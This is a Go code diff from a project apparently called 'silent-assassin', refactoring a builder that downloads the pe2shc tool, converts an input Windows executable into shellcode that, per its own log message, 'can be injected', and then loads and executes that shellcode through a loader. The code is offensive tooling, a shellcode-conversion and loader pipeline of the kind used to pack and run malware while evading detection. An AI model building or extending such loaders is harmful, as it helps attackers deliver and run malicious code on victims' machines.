@@ -22,26 +22,55 @@ func NewBuilder() *Builder {
 // TODO: Cleanup
 func (b *Builder) BuildExecutable(inputFilePath string, outputFilePath string) error {
 	log.Printf("[+] Building executable: %s", outputFilePath)
-	log.Println("[+] Creating temp directory")
 
-	tempDir, err := ioutil.TempDir("", "silent-assassin-*")
+	workspacePath, err := b.createWorkspace()
 	if err != nil {
 		return err
 	}
 
+	if err := b.downloadPe2ShcExecutable(workspacePath); err != nil {
+		return err
+	}
+
+	if err := b.convertPEToShellcode(inputFilePath, outputFilePath, workspacePath); err != nil {
+		return err
+	}
+
+	// TODO: delete after testing!
+	// Load shellcode from output file
+	shellcode, err := os.ReadFile(filepath.Join(workspacePath, "out.exe"))
+	if err != nil {
+		return err
+	}
+
+	if err := b.deleteWorkspace(workspacePath); err != nil {
+		return err
+	}
+
+	// TODO: delete after testing!
+	l := loader.NewLoader(shellcode)
+	return l.Execute()
+}
+
+func (b *Builder) createWorkspace() (string, error) {
+	log.Println("[+] Creating workspace as temp directory")
+
+	tempDir, err := ioutil.TempDir("", "silent-assassin-*")
+	if err != nil {
+		return "", err
+	}
+
 	log.Printf("[+] Temp directory created: %s", tempDir)
+	return tempDir, err
+}
 
-	defer func() {
-		log.Printf("[+] Cleanup - removing temp directory and contents: %s", tempDir)
-		err := os.RemoveAll(tempDir)
-		if err != nil {
-			log.Printf("[ERROR] Error while removing temp directory: %s", err)
-		} else {
-			log.Println("[+] Temp directory and contents successfully removed")
-		}
-	}()
+func (b *Builder) deleteWorkspace(dir string) error {
+	log.Printf("[+] Performing cleanup - removing temp directory and contents: %s", dir)
+	return os.RemoveAll(dir)
+}
 
-	pe2shcExePath := filepath.Join(tempDir, "pe2shc.exe")
+func (b *Builder) downloadPe2ShcExecutable(downloadDir string) error {
+	pe2shcExePath := filepath.Join(downloadDir, "pe2shc.exe")
 	pe2shcExeFile, err := os.Create(pe2shcExePath)
 	if err != nil {
 		return err
@@ -65,19 +94,23 @@ func (b *Builder) BuildExecutable(inputFilePath string, outputFilePath string) e
 		return err
 	}
 
+	return nil
+}
+
+func (b *Builder) convertPEToShellcode(inputFilePath string, outputFilePath string, workspace string) error {
 	log.Printf("[+] Moving input file %s to temp directory as in.exe", inputFilePath)
 	input, err := os.ReadFile(inputFilePath)
 	if err != nil {
 		return err
 	}
 
-	if err := os.WriteFile(filepath.Join(tempDir, "in.exe"), input, 0666); err != nil {
+	if err := os.WriteFile(filepath.Join(workspace, "in.exe"), input, 0666); err != nil {
 		return err
 	}
 
 	log.Println("[+] Executing pe2shc to convert PE file to shellcode so that it can be injected")
 	cmd := exec.Command("./pe2shc.exe", "in.exe", "out.exe")
-	cmd.Dir = tempDir
+	cmd.Dir = workspace
 
 	cmdCombinedOut, err := cmd.CombinedOutput()
 	if err != nil {
@@ -86,13 +119,5 @@ func (b *Builder) BuildExecutable(inputFilePath string, outputFilePath string) e
 
 	log.Printf("[+] pe2shc command output:\n\n%s\n", cmdCombinedOut)
 
-	// TODO: delete after testing!
-	// Load shellcode from output file
-	shellcode, err := os.ReadFile(filepath.Join(tempDir, "out.exe"))
-	if err != nil {
-		return err
-	}
-
-	l := loader.NewLoader(shellcode)
-	return l.Execute()
+	return nil
 }
